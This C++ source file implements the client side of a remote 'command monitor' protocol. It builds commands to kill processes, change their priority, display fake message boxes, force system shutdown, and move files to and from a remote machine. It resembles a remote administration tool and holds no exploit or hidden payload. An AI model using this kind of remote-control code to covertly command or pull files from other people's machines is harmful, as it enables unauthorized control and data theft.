


class CCommandMonitorClient:public CCommandMonitorUtility,public INetworkByteStream
{
	protected:
		CommandMonitorNetworkHeader m_ResultHeader;
		
	public:
 	   ~CCommandMonitorClient();
	    CCommandMonitorClient(UINT32 CommandType=COMMAND_MONITOR_NULL_COMMAND,TCHAR *CommandArgs=0,UINT32 Compression=COMMAND_MONITOR_COMPRESS_NIL,TCHAR ResultSeperator=_T('\n'));

       UINT32 WriteToNetworkByteStream(BYTE* &OutByteStream);
	   UINT32 ReadFromNetworkByteStream(BYTE *InByteStream);
	   UINT32 GetResultantType(void);
	   bool SaveRemoteFile(TCHAR *FileName,TCHAR *DstRootDirPath);
	   bool SetRemoteServerCompression(UINT32 uint32Compression);
	   bool SetFakeMessage(TCHAR *MsgTxt,TCHAR *MsgCap,BYTE MsgType);
	   bool SetProcessPriority(UINT32 ProcessID,BYTE PriorityLevel);
	   bool SetKillProcess(UINT32 ProcessID);
	   bool SetSystemDownMode(bool ForceDown=false);
	   bool GetResult(TCHAR **bytdblptrResult,UINT32 &ResultLength);
	   bool GetResult(BYTE  *bytptrResult,UINT32 &ResultLength);
	   bool SetFileUpLoad(TCHAR *SrcRoot,TCHAR *FileName,TCHAR *TarRoot);
};

CCommandMonitorClient::~CCommandMonitorClient()
{
	//-------Additional Destructions 
}

CCommandMonitorClient::CCommandMonitorClient(UINT32 CommandType,TCHAR *CommandArgs,UINT32 Compression,TCHAR ResultSeperator)
:CCommandMonitorUtility(CommandType,CommandArgs,Compression,ResultSeperator) 	
{
	m_ResultHeader.uint32Length=0;
	COMMAND_MONITOR_SetType(COMMAND_MONITOR_NULL_COMMAND,m_ResultHeader.uint32TypeAndCompression);
	COMMAND_MONITOR_SetCompression(COMMAND_MONITOR_COMPRESS_NIL,m_ResultHeader.uint32TypeAndCompression);
}

bool CCommandMonitorClient::SetRemoteServerCompression(UINT32 uint32Compression)
{
	COMMAND_MONITOR_SetType(COMMAND_MONITOR_SET_COMPRESSION,m_uint32TypeAndCompression);
	m_ulngCommandArgLength=sizeof(UINT32);
	return CopyBytes((BYTE**)&m_tchrCommandArguments,(BYTE*)&uint32Compression,sizeof(UINT32)); 
}

UINT32 CCommandMonitorClient::WriteToNetworkByteStream(BYTE* &OutByteStream)
{
	CommandMonitorNetworkHeader Header;
	try
	{
		CGeneralMemoryUtility::DeleteAll((void**)&OutByteStream);

		Header.uint32TypeAndCompression=m_uint32TypeAndCompression;
		Header.uint32Length=0; 
		if(!AllocateMem((void**)&OutByteStream,sizeof(BYTE)*(sizeof(WinMonitorNetworkServiceHeader)+sizeof(CommandMonitorNetworkHeader)))) return 0;
		BYTE *OutStream=(BYTE*)(OutByteStream+sizeof(WinMonitorNetworkServiceHeader));
        *((CommandMonitorNetworkHeader*)OutStream)=Header;

        UINT32 ArgLen=m_ulngCommandArgLength;

		if(!ArgLen) return sizeof(CommandMonitorNetworkHeader);

		BYTE *DataCompressed=0;
	    UINT32 CompressedChars=0;
		bool IsCompress=true;
		try
		{
			switch(COMMAND_MONITOR_GetCompression(m_uint32TypeAndCompression))
			{
				case COMMAND_MONITOR_COMPRESS_LZSS:
					CLzhCompress Compress;
					Compress.lzh_freeze_memory((void*)m_tchrCommandArguments,ArgLen,(void**)&DataCompressed,(int*)&CompressedChars);
					break;
				
				case COMMAND_MONITOR_COMPRESS_NIL:

				default: 
					CompressedChars=ArgLen; DataCompressed=m_tchrCommandArguments;
					if(!DataCompressed) return 0;
					IsCompress=false;
			}
		}catch(...) { return 0; }
		if(!CompressedChars) return 0;

		Header.uint32Length=CompressedChars;
		bool blnOk=false;
		try
		{
			OutByteStream=(BYTE*)ReAllocateMemory((void*)OutByteStream,sizeof(WinMonitorNetworkServiceHeader)+sizeof(CommandMonitorNetworkHeader)+Header.uint32Length);
			if(!OutByteStream) return 0;
			OutStream=(BYTE*)(OutByteStream+sizeof(WinMonitorNetworkServiceHeader));
			if(CopyBytes(OutStream,(BYTE*)&Header,sizeof(CommandMonitorNetworkHeader)) &&
			   CopyBytes(OutStream+sizeof(CommandMonitorNetworkHeader),DataCompressed,CompressedChars)) 
			   blnOk=true;
			else blnOk=false;
		}
		catch(...)
		{	blnOk=false; }

		if(IsCompress) CGeneralMemoryUtility::DeleteAll((void**)&DataCompressed);
		if(blnOk) return sizeof(CommandMonitorNetworkHeader)+Header.uint32Length;
		else return 0;
	}
	catch(...) { return 0; }
}

UINT32 CCommandMonitorClient::ReadFromNetworkByteStream(BYTE *InByteStream)
{
	CommandMonitorNetworkHeader Header;
	try
	{
		Header=*((CommandMonitorNetworkHeader*)InByteStream);
		m_ResultHeader=Header;
		if(Header.uint32Length<=0) return sizeof(CommandMonitorNetworkHeader);
		TCHAR *CommandResult=(TCHAR*)(InByteStream+sizeof(CommandMonitorNetworkHeader));
		BYTE *DataDCompressed=0;
		int CharsDCompressed=0;
		try
		{
			switch(COMMAND_MONITOR_GetCompression(Header.uint32TypeAndCompression))
			{
				case COMMAND_MONITOR_COMPRESS_LZSS:
					switch(COMMAND_MONITOR_GetCompression(Header.uint32TypeAndCompression))
					{
						case COMMAND_MONITOR_COMPRESS_LZSS:
							CLzhCompress Compress;
							Compress.lzh_melt_memory(CommandResult,Header.uint32Length,(void**)&DataDCompressed,
												(int*)&CharsDCompressed);
							break;

			 		}
					CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandResult);
					m_tchrCommandResult=(BYTE*)DataDCompressed;
					m_ulngResultLength=CharsDCompressed; 
					break;

				case COMMAND_MONITOR_COMPRESS_NIL:

				default: 
					m_ulngResultLength=0; 
					if(!AllocateMem((TCHAR**)&m_tchrCommandResult,CommandResult,Header.uint32Length)) return 0;  
					m_ulngResultLength=Header.uint32Length;
			}
		}catch(...) { return 0; }
		return sizeof(CommandMonitorNetworkHeader)+Header.uint32Length;

	}
	catch(...) { return 0; }

}

UINT32 CCommandMonitorClient::GetResultantType(void)
{
	return COMMAND_MONITOR_GetType(m_ResultHeader.uint32TypeAndCompression);
}

bool CCommandMonitorClient::SaveRemoteFile(TCHAR *FileName,TCHAR *DstRootDirPath)
{
	if(COMMAND_MONITOR_GetType(m_ResultHeader.uint32TypeAndCompression)!=COMMAND_MONITOR_DOWNLOADED_FILE) 
		return false;
	else
		return SaveFileToDisk(FileName,DstRootDirPath,m_tchrCommandResult,m_ulngResultLength);
}


bool CCommandMonitorClient::GetResult(TCHAR **bytdblptrResult,UINT32 &ResultLength)
{
	if((ResultLength=m_ulngResultLength)<=0) return false; 
	if(!CGeneralMemoryUtility::AllocateMem((TCHAR**)bytdblptrResult,(TCHAR*)m_tchrCommandResult,m_ulngResultLength))
		return false;
	else return true;
}


bool CCommandMonitorClient::GetResult(BYTE *bytptrResult,UINT32 &ResultLength)
{
	if(!ResultLength)
	{
		if((ResultLength=m_ulngResultLength)<=0) return 0; 
		return 1;
	}
	if(ResultLength=m_ulngResultLength,!CopyBytes(bytptrResult,m_tchrCommandResult,m_ulngResultLength))
		return 0; 
	else return 1;
}

bool CCommandMonitorClient::SetSystemDownMode(bool ForceDown)
{	
	if(m_ulngCommandArgLength=0,CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandArguments),ForceDown==true)
		if(!AllocateMem((void**)&m_tchrCommandArguments,sizeof(BYTE))) return false;
		else *((BYTE*)m_tchrCommandArguments)=COMMAND_MONITOR_SYSTEM_DOWN_IMMEDIATE,m_ulngCommandArgLength=sizeof(BYTE);
	else m_tchrCommandArguments=0;
	
	return true;
}

bool CCommandMonitorClient::SetKillProcess(UINT32 ProcessID)
{
	m_ulngCommandArgLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandArguments); 
	if(!AllocateMem((void**)&m_tchrCommandArguments,sizeof(DWORD))) return false;
	*((DWORD*)m_tchrCommandArguments)=ProcessID;
	m_ulngCommandArgLength=sizeof(DWORD);
	COMMAND_MONITOR_SetType(COMMAND_MONITOR_KILL_PROCESS,m_uint32TypeAndCompression); 
	return true;
}

bool CCommandMonitorClient::SetProcessPriority(UINT32 ProcessID,BYTE PriorityLevel)
{
	m_ulngCommandArgLength=0;
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandArguments); 
	if(!AllocateMem((void**)&m_tchrCommandArguments,sizeof(DWORD)+sizeof(BYTE))) return false;
	*((DWORD*)m_tchrCommandArguments)=ProcessID;
	*((BYTE*)(m_tchrCommandArguments+sizeof(DWORD)))=PriorityLevel;
	m_ulngCommandArgLength=sizeof(DWORD)+sizeof(BYTE);
	COMMAND_MONITOR_SetType(COMMAND_MONITOR_SET_PROC_PRIORITY,m_uint32TypeAndCompression); 
	return true;
}

bool CCommandMonitorClient::SetFakeMessage(TCHAR *MsgTxt,TCHAR *MsgCap,BYTE MsgType)
{
  try
  {
	m_ulngCommandArgLength=0;
	FakeMessageHeader Header;
	Header.byt_MsgType=MsgType;
	Header.byt_TextLen=(BYTE)_tcslen(MsgTxt); 
	Header.byt_Captionlen=(BYTE)_tcslen(MsgCap); 
	CGeneralMemoryUtility::DeleteAll((void**)&m_tchrCommandArguments); 
	AllocateMem((void**)&m_tchrCommandArguments,sizeof(FakeMessageHeader)+sizeof(TCHAR)*(Header.byt_TextLen+Header.byt_Captionlen+2));
	*((FakeMessageHeader*)m_tchrCommandArguments)=Header;
	CopyBytes(m_tchrCommandArguments+sizeof(FakeMessageHeader),(BYTE*)MsgTxt,(Header.byt_TextLen)*sizeof(TCHAR));	
	CopyBytes(m_tchrCommandArguments+sizeof(FakeMessageHeader)+(Header.byt_TextLen)*sizeof(TCHAR),
	        (BYTE*)MsgCap,(Header.byt_Captionlen)*sizeof(TCHAR));
	COMMAND_MONITOR_SetType(COMMAND_MONITOR_DISPLAY_MSG,m_uint32TypeAndCompression); 
	m_ulngCommandArgLength=sizeof(FakeMessageHeader)+sizeof(TCHAR)*(Header.byt_TextLen+Header.byt_Captionlen);
	return true;
  }
  catch(...) { return false; }
}

bool CCommandMonitorClient::SetFileUpLoad(TCHAR *SrcRoot,TCHAR *FileName,TCHAR *TarRoot)
{
	TCHAR *tchrRealFile=0;
	UINT32 uintLength=0;
	FileUpLoadHeader Header;

	m_ulngCommandArgLength=0;

	if(!AllocateMem(&tchrRealFile,SrcRoot)) return false;
	if(!ReAllocateString(&tchrRealFile,_T("\\"))) return false;
	if(!ReAllocateString(&tchrRealFile,FileName)) return false;

	if(!LoadFileFromDisk(tchrRealFile,(void**)&m_tchrCommandArguments,m_ulngCommandArgLength,sizeof(FileUpLoadHeader)+(Header.uint16PathLength=sizeof(TCHAR)*(_tcslen(TarRoot)+_tcslen(FileName)+2)))) return false;

	if(!AllocateMem(&tchrRealFile,TarRoot)) return false;
	if(!ReAllocateString(&tchrRealFile,_T("\\"))) return false;
	if(!ReAllocateString(&tchrRealFile,FileName)) return false;
	
	*((FileUpLoadHeader*)m_tchrCommandArguments)=Header;
	if(!CopyBytes(m_tchrCommandArguments+sizeof(FileUpLoadHeader),(BYTE*)tchrRealFile,Header.uint16PathLength)) return false;  
	COMMAND_MONITOR_SetType(COMMAND_MONITOR_UPLOADED_FILE,m_uint32TypeAndCompression); 
	return true;
}

//---------------------------------------------------------------------------------//